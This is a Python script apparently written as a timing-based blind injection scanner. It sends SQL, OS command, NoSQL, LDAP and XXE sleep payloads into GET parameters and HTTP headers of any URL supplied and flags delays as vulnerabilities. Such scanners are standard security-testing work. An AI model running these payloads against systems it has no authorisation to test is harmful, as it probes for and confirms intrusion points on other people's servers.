#!/usr/bin/env python3
import asyncio
import aiohttp
import statistics
import time
import json
from pathlib import Path

PROBES = [
    # MySQL sleep
    ("safe",  "' OR SLEEP(5)-- -",                          "sql_mysql"),
    ("safe",  "1 AND SLEEP(5)-- -",                         "sql_mysql_num"),
    ("safe",  "' AND SLEEP(5) AND '1'='1",                  "sql_mysql_and"),
    # PostgreSQL sleep
    ("safe",  "' || pg_sleep(5) || '",                      "sql_postgres"),
    ("safe",  "1; SELECT pg_sleep(5)-- -",                  "sql_postgres_stacked"),
    # MSSQL delay
    ("safe",  "'; WAITFOR DELAY '0:0:5'--",                 "sql_mssql"),
    ("safe",  "1; WAITFOR DELAY '0:0:5'--",                 "sql_mssql_num"),
    # MySQL subquery
    ("safe",  "' AND (SELECT * FROM (SELECT(SLEEP(5)))a)-- -", "sql_mysql_sub"),
    # Oracle (no-op if Oracle not present)
    ("safe",  "' || DBMS_PIPE.RECEIVE_MESSAGE('a',5)-- ",   "sql_oracle"),
    # SQLite randomblob (CPU spin, not a true sleep — included for coverage)
    ("safe",  "1 AND (SELECT COUNT(*) FROM sqlite_master t1, sqlite_master t2, sqlite_master t3)>0 AND SLEEP(5)-- -", "sql_sqlite"),
    # OS command injection
    ("safe",  ";sleep 5;",                                   "cmd_unix_semicolon"),
    ("safe",  "|sleep 5|",                                   "cmd_unix_pipe"),
    ("safe",  "$(sleep 5)",                                  "cmd_unix_subshell"),
    ("safe",  "&& sleep 5 &&",                               "cmd_unix_and"),
    ("safe",  "`sleep 5`",                                   "cmd_unix_backtick"),
    ("safe",  "%0asleep%205",                                "cmd_unix_newline"),
    # Windows command injection
    ("safe",  "& timeout /t 5 &",                           "cmd_windows_timeout"),
    ("safe",  "| timeout /t 5",                             "cmd_windows_pipe"),
    # NoSQL / MongoDB
    ('{"a":1}', '{"$where":"sleep(5000)"}',                 "nosql_mongo_where"),
    ('{"a":1}', '{"$where":"function(){sleep(5000)}"}',     "nosql_mongo_fn"),
    # LDAP injection (blind)
    ("safe",  "*(|(objectClass=*))",                        "ldap_blind"),
    # XML / XXE timing
    ("safe",  "<?xml version='1.0'?><!DOCTYPE x [<!ENTITY xxe SYSTEM 'http://127.0.0.1:12345/'>]><x>&xxe;</x>", "xxe_ssrf_timing"),
]

GET_PARAMS = [
    "q", "query", "search", "id", "user", "name", "input",
    "data", "value", "text", "s", "filter", "sort", "page",
    "cmd", "exec", "file", "path", "url", "redirect",
    "keyword", "term", "param", "field", "key", "token",
    "username", "email", "phone", "address", "code",
]

HEADERS_TO_INJECT = [
    "User-Agent",
    "Referer",
    "X-Forwarded-For",
    "X-Custom-Header",
    "Accept-Language",
]

POST_ENDPOINTS = [
    "/api/search", "/api/login", "/api/register",
    "/api/users", "/api/query", "/api/filter",
    "/search", "/login", "/register",
]


class TimeBleed:
    def __init__(self, url):
        self.url = url
        self.findings = []
        self.jitter = None

    async def t_req(self, sess, params=None, data=None, headers=None, method='GET'):
        t0 = time.perf_counter()
        try:
            timeout = aiohttp.ClientTimeout(total=15)
            if method == 'GET':
                async with sess.get(self.url, params=params or {}, headers=headers or {},
                                    ssl=False, timeout=timeout) as r:
                    await r.read()
            else:
                async with sess.post(self.url, json=data or {}, headers=headers or {},
                                     ssl=False, timeout=timeout) as r:
                    await r.read()
            return time.perf_counter() - t0
        except asyncio.TimeoutError:
            return 15.0
        except Exception:
            return None

    async def jitter_phase(self, sess):
        print("[*] Measuring baseline RTT (warm-up + measure)...")
        # Warm-up requests to avoid cold-start skew
        for _ in range(3):
            await self.t_req(sess, params={"_warmup": "1"})

        ts = []
        for i in range(15):
            t = await self.t_req(sess, params={"_baseline": str(i)})
            if t is not None and t < 10:
                ts.append(t)

        if not ts:
            raise RuntimeError("Target unreachable during baseline")

        avg = statistics.mean(ts)
        std = statistics.pstdev(ts) or 0.05
        med = statistics.median(ts)
        mad = statistics.median([abs(t - med) for t in ts]) or 0.02
        # Threshold: must exceed both median+4*MAD and avg+4*std, plus the sleep duration
        thresh = max(med + 4 * mad, avg + 4 * std) + 3.5
        self.jitter = {'avg': avg, 'std': std, 'median': med, 'mad': mad, 'thresh': thresh}
        print(f"[+] RTT: avg={avg:.3f}s med={med:.3f}s std={std:.3f}s | threshold={thresh:.3f}s")

    async def _probe_triple(self, sess, ctrl_params, treat_params, method='GET',
                             ctrl_data=None, treat_data=None, ctrl_headers=None, treat_headers=None):
        tc = await self.t_req(sess, params=ctrl_params, data=ctrl_data, headers=ctrl_headers, method=method)
        if tc is None:
            return None, None, None, None

        times = []
        for _ in range(3):
            t = await self.t_req(sess, params=treat_params, data=treat_data, headers=treat_headers, method=method)
            if t is None:
                return None, None, None, None
            times.append(t)

        tmed = statistics.median(times)
        delta = tmed - tc
        return tc, times, tmed, delta

    def _record_finding(self, param, cat, payload, tc, times, tmed, delta, context='GET param'):
        confidence = min(99.9, (delta / 5.0) * 50 + max(0, 1 - statistics.pstdev(times)) * 50)
        severity = 'CRITICAL' if cat.startswith('sql') or cat.startswith('cmd') else 'HIGH'
        print(f"  [VULN] [{cat}] {context}={param} ctrl={tc:.2f}s treat={tmed:.2f}s "
              f"delta={delta:.2f}s conf={confidence:.1f}%")
        self.findings.append({
            'context': context,
            'param': param,
            'category': cat,
            'severity': severity,
            'payload': payload,
            'control_time': round(tc, 3),
            'treatment_times': [round(t, 3) for t in times],
            'delta': round(delta, 3),
            'confidence': round(confidence, 1),
            'confidence_label': 'High' if confidence >= 75 else 'Medium',
            'proof': f'All 3 requests delayed {delta:.2f}s beyond baseline+threshold ({self.jitter["thresh"]:.2f}s)',
            'remediation': 'Use parameterized queries / safe APIs; never interpolate user input into queries',
        })

    async def test_get_param(self, sess, param):
        print(f"\n[*] GET param: {param}")
        for ctrl, treat, cat in PROBES:
            tc, times, tmed, delta = await self._probe_triple(
                sess,
                ctrl_params={param: ctrl},
                treat_params={param: treat},
            )
            if tc is None or delta is None:
                continue
            if all(t > self.jitter['thresh'] for t in times) and delta > 3.5:
                self._record_finding(param, cat, treat, tc, times, tmed, delta, 'GET param')
                break

    async def test_post_body(self, sess, endpoint, param):
        url_bk = self.url
        self.url = self.target_base + endpoint
        print(f"\n[*] POST body param: {param} at {endpoint}")
        for ctrl, treat, cat in PROBES:
            tc, times, tmed, delta = await self._probe_triple(
                sess,
                ctrl_params=None, treat_params=None,
                ctrl_data={param: ctrl, 'extra': 'test'},
                treat_data={param: treat, 'extra': 'test'},
                method='POST',
            )
            if tc is None or delta is None:
                continue
            if all(t > self.jitter['thresh'] for t in times) and delta > 3.5:
                self._record_finding(f"{endpoint}::{param}", cat, treat, tc, times, tmed, delta, 'POST body')
                break
        self.url = url_bk

    async def test_header_injection(self, sess, header_name):
        print(f"\n[*] Header injection: {header_name}")
        for ctrl, treat, cat in PROBES[:10]:
            tc, times, tmed, delta = await self._probe_triple(
                sess,
                ctrl_params={"_hdr": "1"}, treat_params={"_hdr": "2"},
                ctrl_headers={header_name: ctrl},
                treat_headers={header_name: treat},
            )
            if tc is None or delta is None:
                continue
            if all(t > self.jitter['thresh'] for t in times) and delta > 3.5:
                self._record_finding(header_name, cat, treat, tc, times, tmed, delta, 'HTTP header')
                break

    async def run(self):
        conn = aiohttp.TCPConnector(limit=5, ssl=False)
        async with aiohttp.ClientSession(
            connector=conn,
            headers={'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)'}
        ) as sess:
            await self.jitter_phase(sess)

            # GET parameter injection
            print("\n[*] Phase 1: GET parameter injection")
            for p in GET_PARAMS:
                await self.test_get_param(sess, p)

            # HTTP header injection
            print("\n[*] Phase 2: HTTP header injection")
            for hdr in HEADERS_TO_INJECT:
                await self.test_header_injection(sess, hdr)

        return self.findings


def get_target():
    p = Path("reports/_target.txt")
    if p.exists():
        base = p.read_text().strip()
        if base:
            print(f"[+] Target from file: {base}")
            return base
    print("[?] Endpoint to test (e.g. https://example.com/api/search):")
    u = input("    URL: ").strip()
    if not u:
        raise SystemExit("No target provided")
    return u if u.startswith("http") else "https://" + u


def main():
    print("=" * 60)
    print("  TimeBleed — Timing Oracle Injection Scanner")
    print("=" * 60)
    target = get_target()
    print(f"[+] Endpoint: {target}")
    Path("reports").mkdir(exist_ok=True)

    scanner = TimeBleed(target)
    scanner.target_base = '/'.join(target.split('/')[:3])
    findings = asyncio.run(scanner.run())

    with open("reports/timebleed.json", 'w') as f:
        json.dump(findings, f, indent=2, default=str)
    print(f"\n[+] {len(findings)} findings -> reports/timebleed.json")
    for sev in ['CRITICAL', 'HIGH']:
        items = [f for f in findings if f.get('severity') == sev]
        if items:
            print(f"\n[!] {len(items)} {sev}:")
            for item in items:
                print(f"    [{item['category']}] {item['context']}={item['param']} delta={item['delta']}s")


if __name__ == '__main__':
    main()
